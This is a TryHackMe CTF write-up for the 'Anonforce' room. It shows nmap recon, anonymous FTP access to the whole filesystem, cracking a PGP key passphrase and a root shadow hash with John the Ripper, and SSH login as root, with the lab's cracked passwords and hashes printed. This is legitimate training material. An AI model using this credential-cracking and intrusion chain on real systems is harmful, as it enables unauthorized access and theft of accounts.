# Anonforce

- [Room information](#room-information)
- [Solution](#solution)
- [References](#references)

## Room information

```text
Type: Challenge
Difficulty: Easy
OS: Linux
Subscription type: Free
Description: boot2root machine for FIT and bsides guatemala CTF
```

Room link: [https://tryhackme.com/r/room/bsidesgtanonforce](https://tryhackme.com/r/room/bsidesgtanonforce)

## Solution

### Check for services with nmap

We start by scanning the machine with `nmap`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Anonforce]
└─$ nmap -v -sV -sC -p- 10.10.163.233
Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-24 08:02 CEST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 08:02
Completed NSE at 08:02, 0.00s elapsed
Initiating NSE at 08:02
Completed NSE at 08:02, 0.00s elapsed
Initiating NSE at 08:02
Completed NSE at 08:02, 0.00s elapsed
Initiating Ping Scan at 08:02
Scanning 10.10.163.233 [2 ports]
Completed Ping Scan at 08:02, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 08:02
Completed Parallel DNS resolution of 1 host. at 08:02, 0.00s elapsed
Initiating Connect Scan at 08:02
Scanning 10.10.163.233 [65535 ports]
Discovered open port 22/tcp on 10.10.163.233
Discovered open port 21/tcp on 10.10.163.233
Completed Connect Scan at 08:02, 13.72s elapsed (65535 total ports)
Initiating Service scan at 08:02
Scanning 2 services on 10.10.163.233
Completed Service scan at 08:02, 0.10s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.163.233.
Initiating NSE at 08:02
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
Completed NSE at 08:03, 6.44s elapsed
Initiating NSE at 08:03
Completed NSE at 08:03, 0.32s elapsed
Initiating NSE at 08:03
Completed NSE at 08:03, 0.00s elapsed
Nmap scan report for 10.10.163.233
Host is up (0.044s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.14.61.233
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
| drwxr-xr-x   17 0        0            3700 Jun 23 22:57 dev
| drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
| lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
| drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
| drwx------    2 0        0           16384 Aug 11  2019 lost+found
| drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
| drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
| drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread [NSE: writeable]
| drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
| dr-xr-xr-x   95 0        0               0 Jun 23 22:57 proc
| drwx------    3 0        0            4096 Aug 11  2019 root
| drwxr-xr-x   18 0        0             540 Jun 23 22:57 run
| drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
| drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
| dr-xr-xr-x   13 0        0               0 Jun 23 22:57 sys
| drwxrwxrwt    9 0        0            4096 Jun 23 22:57 tmp [NSE: writeable]
| drwxr-xr-x   10 0        0            4096 Aug 11  2019 usr
| drwxr-xr-x   11 0        0            4096 Aug 11  2019 var
| lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic
|_lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8af9483e11a1aafcb78671d02af624e7 (RSA)
|   256 735dde9a886e647ae187ec65ae1193e3 (ECDSA)
|_  256 56f99f24f152fc16b77ba3e24f17b4ea (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 08:03
Completed NSE at 08:03, 0.00s elapsed
Initiating NSE at 08:03
Completed NSE at 08:03, 0.00s elapsed
Initiating NSE at 08:03
Completed NSE at 08:03, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.16 seconds
```

We have two services running:

- vsftpd v3.0.3 on port 21
- OpenSSH v7.2p2 on port 22

### Check for files on the FTP-server

From the FTP-listing above it almost seems like the entire system is shared via FTP.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Anonforce]
└─$ ftp 10.10.163.233
Connected to 10.10.163.233.
220 (vsFTPd 3.0.3)
Name (10.10.163.233:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||42726|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Aug 11  2019 bin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 boot
drwxr-xr-x   17 0        0            3700 Jun 23 22:57 dev
drwxr-xr-x   85 0        0            4096 Aug 13  2019 etc
drwxr-xr-x    3 0        0            4096 Aug 11  2019 home
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img -> boot/initrd.img-4.4.0-157-generic
lrwxrwxrwx    1 0        0              33 Aug 11  2019 initrd.img.old -> boot/initrd.img-4.4.0-142-generic
drwxr-xr-x   19 0        0            4096 Aug 11  2019 lib
drwxr-xr-x    2 0        0            4096 Aug 11  2019 lib64
drwx------    2 0        0           16384 Aug 11  2019 lost+found
drwxr-xr-x    4 0        0            4096 Aug 11  2019 media
drwxr-xr-x    2 0        0            4096 Feb 26  2019 mnt
drwxrwxrwx    2 1000     1000         4096 Aug 11  2019 notread
drwxr-xr-x    2 0        0            4096 Aug 11  2019 opt
dr-xr-xr-x   92 0        0               0 Jun 23 22:57 proc
drwx------    3 0        0            4096 Aug 11  2019 root
drwxr-xr-x   18 0        0             540 Jun 23 22:57 run
drwxr-xr-x    2 0        0           12288 Aug 11  2019 sbin
drwxr-xr-x    3 0        0            4096 Aug 11  2019 srv
dr-xr-xr-x   13 0        0               0 Jun 23 22:57 sys
drwxrwxrwt    9 0        0            4096 Jun 23 22:57 tmp
drwxr-xr-x   10 0        0            4096 Aug 11  2019 usr
drwxr-xr-x   11 0        0            4096 Aug 11  2019 var
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz -> boot/vmlinuz-4.4.0-157-generic
lrwxrwxrwx    1 0        0              30 Aug 11  2019 vmlinuz.old -> boot/vmlinuz-4.4.0-142-generic
226 Directory send OK.
ftp> cd notread
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||40985|)
150 Here comes the directory listing.
-rwxrwxrwx    1 1000     1000          524 Aug 11  2019 backup.pgp
-rwxrwxrwx    1 1000     1000         3762 Aug 11  2019 private.asc
226 Directory send OK.
ftp> mget *
mget backup.pgp [anpqy?]? a
Prompting off for duration of mget.
229 Entering Extended Passive Mode (|||11688|)
150 Opening BINARY mode data connection for backup.pgp (524 bytes).
100% |************************************************************************************************************************|   524      398.84 KiB/s    00:00 ETA
226 Transfer complete.
524 bytes received in 00:00 (11.19 KiB/s)
229 Entering Extended Passive Mode (|||43673|)
150 Opening BINARY mode data connection for private.asc (3762 bytes).
100% |************************************************************************************************************************|  3762        5.46 MiB/s    00:00 ETA
226 Transfer complete.
3762 bytes received in 00:00 (82.21 KiB/s)
ftp> cd ..
250 Directory successfully changed.
ftp> cd home
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||19247|)
150 Here comes the directory listing.
drwxr-xr-x    4 1000     1000         4096 Aug 11  2019 melodias
226 Directory send OK.
ftp> cd melodias
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||12102|)
150 Here comes the directory listing.
-rw-rw-r--    1 1000     1000           33 Aug 11  2019 user.txt
226 Directory send OK.
ftp> mget *
mget user.txt [anpqy?]? a
Prompting off for duration of mget.
229 Entering Extended Passive Mode (|||22469|)
150 Opening BINARY mode data connection for user.txt (33 bytes).
100% |************************************************************************************************************************|    33       31.25 KiB/s    00:00 ETA
226 Transfer complete.
33 bytes received in 00:00 (0.71 KiB/s)
ftp> cd ..
250 Directory successfully changed.
ftp> cd root
550 Failed to change directory.
ftp> quit
221 Goodbye.
```

We have two files and a likely user flag.

### Get the user flag

Next we check and verify the user flag

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Anonforce]
└─$ ls
backup.pgp  private.asc  user.txt

┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Anonforce]
└─$ cat user.txt                                       
6<REDACTED>8
```

### Crack the PGP private key

Now, we turn our attention to the PGP ASCII armored file `private.asc` and try to crack it with [John the Ripper](https://www.openwall.com/john/)

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Anonforce]
└─$ gpg2john private.asc 

File private.asc
anonforce:$gpg$*17*54*2048*e419ac715ed55197122fd0acc6477832266db83b63a3f0d16b7f5fb3db2b93a6a995013bb1e7aff697e782d505891ee260e957136577*3*254*2*9*16*5d044d82578ecc62baaa15c1bcf1cfdd*65536*d7d11d9bf6d08968:::anonforce <melodias@anonforce.nsa>::private.asc

┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Anonforce]
└─$ gpg2john private.asc > hash.txt

File private.asc

┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Anonforce]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt          
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
xbox360          (anonforce)     
1g 0:00:00:00 DONE (2024-06-24 08:32) 6.666g/s 6240p/s 6240c/s 6240C/s xbox360..yourmom
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

So the password is `xbox360`.

### Analyze the encrypted file

Next, we import the private key and decrypt the `backup.pgp` file

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Anonforce]
└─$ gpg --import private.asc       
gpg: key B92CD1F280AD82C2: public key "anonforce <melodias@anonforce.nsa>" imported
gpg: key B92CD1F280AD82C2: secret key imported
gpg: key B92CD1F280AD82C2: "anonforce <melodias@anonforce.nsa>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1

┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Anonforce]
└─$ gpg --decrypt backup.pgp 
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12
      "anonforce <melodias@anonforce.nsa>"
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18120:0:99999:7:::
uuidd:*:18120:0:99999:7:::
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
sshd:*:18120:0:99999:7:::
ftp:*:18120:0:99999:7:::  
```

We have hashes for both the `root` and `melodias` user. Let's try to crack them.

### Crack the user hashes

Extract the two hashes with `grep` to a file and try to crack it with `john`

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Anonforce]
└─$ gpg --decrypt backup.pgp | grep -e root -e melodias > user_hashes.txt
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12
      "anonforce <melodias@anonforce.nsa>"

┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Anonforce]
└─$ cat user_hashes.txt 
root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::

┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Anonforce]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt user_hashes.txt 
Warning: only loading hashes of type "sha512crypt", but also saw type "md5crypt"
Use the "--format=md5crypt" option to force loading hashes of that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
hikari           (root)     
1g 0:00:00:02 DONE (2024-06-24 08:43) 0.4545g/s 3258p/s 3258c/s 3258C/s 98765432..emoemo
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

The password for root is `hikari`.

We can also try to crack the hash for `melodias` but the password isn't in the rockyou wordlist.

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Anonforce]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt user_hashes.txt
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:01:14 DONE (2024-06-24 08:54) 0g/s 189110p/s 189110c/s 189110C/s !!!0mc3t..*7¡Vamos!
Session completed. 
```

### Get the root flag

Now that we have the password for root we can connect via SSH and get the root flag

```bash
┌──(kali㉿kali)-[/mnt/…/TryHackMe/CTFs/Easy/Anonforce]
└─$ ssh root@10.10.163.233            
The authenticity of host '10.10.163.233 (10.10.163.233)' can't be established.
ED25519 key fingerprint is SHA256:+bhLW3R5qYI2SvPQsCWR9ewCoewWWvFfTVFQUAGr+ew.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.163.233' (ED25519) to the list of known hosts.
root@10.10.163.233's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-157-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

root@ubuntu:~# cat /root/root.txt
f<REDACTED>e
root@ubuntu:~# 
```

Excellent!

For additional information, please see the references below.

## References

- [gpg - Linux manual page](https://linux.die.net/man/1/gpg)
- [grep - Linux manual page](https://man7.org/linux/man-pages/man1/grep.1.html)
- [John the Ripper - Homepage](https://www.openwall.com/john/)
- [nmap - Linux manual page](https://linux.die.net/man/1/nmap)
- [OpenSSH - Wikipedia](https://en.wikipedia.org/wiki/OpenSSH)
- [Pretty Good Privacy - Wikipedia](https://sv.wikipedia.org/wiki/Pretty_Good_Privacy)
